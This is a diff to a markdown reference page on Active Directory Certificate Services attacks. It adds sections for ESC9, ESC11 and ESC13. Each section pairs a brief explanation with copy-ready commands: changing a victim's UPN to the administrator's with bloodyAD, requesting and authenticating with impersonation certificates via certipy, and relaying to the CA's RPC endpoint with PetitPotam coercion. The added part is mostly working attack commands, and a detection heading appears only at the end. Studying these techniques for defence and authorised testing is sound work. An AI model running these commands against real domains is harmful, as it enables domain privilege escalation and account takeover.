@@ -1,4 +1,4 @@
-# ADCS Attacks (ESC1–ESC8)
+# ADCS Attacks (ESC1–ESC9, ESC11, ESC13)
 
 **MITRE:** T1649
 
@@ -75,6 +75,47 @@ AD CS has NTLM-authenticating HTTP endpoint. Can be abused via NTLM relay to obt
 ```bash
 ntlmrelayx.py -t http://ca.corp.local/certsrv/certfnsh.asp \
   --adcs --template 'DomainController'
+```
+
+## ESC9 — No Security Extension
+
+The template has `CT_FLAG_NO_SECURITY_EXTENSION` (0x00080000) in `msPKI-Enrollment-Flag`. Issued certificates do **not** include the `szOID_NTDS_CA_SECURITY_EXT` extension, which normally binds the certificate to an AD SID.
+
+Without SID binding, if the enrollee's `userPrincipalName` is changed to match another account's UPN before requesting the cert, the cert maps to the other account.
+
+**Requires:** GenericWrite (or equivalent) over a victim account.
+
+```bash
+# 1. Change victim's UPN to impersonate target
+bloodyAD -u jdoe -p 'Pass' -d corp.local \
+  set object victim userPrincipalName administrator@corp.local
+
+# 2. Request cert as victim
+certipy req -u victim@corp.local -p 'victimpass' -ca 'CORP-CA' -template 'VulnTemplate'
+
+# 3. Restore victim's UPN, then authenticate
+certipy auth -pfx administrator.pfx -domain corp.local -dc-ip 10.0.0.1
+```
+
+## ESC11 — ICPR/DCOM Relay
+
+The legacy MS-ICPR (RPC-based Certificate Enrollment) interface can be relayed similar to ESC8, but over DCOM instead of HTTP. No remote check is possible — manual verification required.
+
+```bash
+certipy relay -target 'rpc://ca.corp.local' -template 'DomainController'
+# Trigger coercion: python3 PetitPotam.py <attacker-ip> ca.corp.local
+```
+
+## ESC13 — Issuance Policy OID Linked to Group
+
+A certificate template references an issuance policy OID (via `msPKI-Certificate-Policy`) that has `msDS-OIDToGroupLink` pointing to a privileged AD group. When a user authenticates with such a certificate, they receive the group's privileges in their Kerberos PAC.
+
+```bash
+# Enroll in the policy-linked template
+certipy req -u jdoe@corp.local -p 'Pass' -ca 'CORP-CA' -template 'PolicyTemplate'
+
+# Authenticate — group membership is applied via OID in the cert
+certipy auth -pfx jdoe.pfx -domain corp.local -dc-ip 10.0.0.1
 ```
 
 ## Detection with adpath
